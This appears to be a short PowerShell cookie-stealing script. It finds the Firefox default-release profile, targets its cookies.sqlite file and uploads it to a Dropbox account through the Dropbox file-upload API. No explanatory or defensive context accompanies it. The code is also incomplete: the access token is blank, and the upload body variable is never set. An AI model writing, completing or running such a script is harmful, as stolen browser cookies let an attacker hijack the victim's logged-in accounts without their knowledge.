

$firefoxProfilePath = Join-Path -Path $env:APPDATA -ChildPath 'Mozilla\Firefox\Profiles'
$firefoxProfile = Get-ChildItem -Path $firefoxProfilePath | Where-Object {$_.Name -like "*default-release"}

$filePath = Join-Path -Path $firefoxProfile.FullName -ChildPath 'cookies.sqlite'

$accessToken = ""
$authHeader = @{Authorization = "Bearer $accessToken"}
$dropboxFilePath = "/cookies_exported.sqlite"

$uploadUrl = "https://content.dropboxapi.com/2/files/upload"

$headers = @{}
$headers.Add("Authorization", "Bearer $accessToken")
$headers.Add("Dropbox-API-Arg", '{"path":"' + $dropboxFilePath + '","mode":"add","autorename":true,"mute":false}')
$headers.Add("Content-Type", "application/octet-stream")

Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body $fileContent
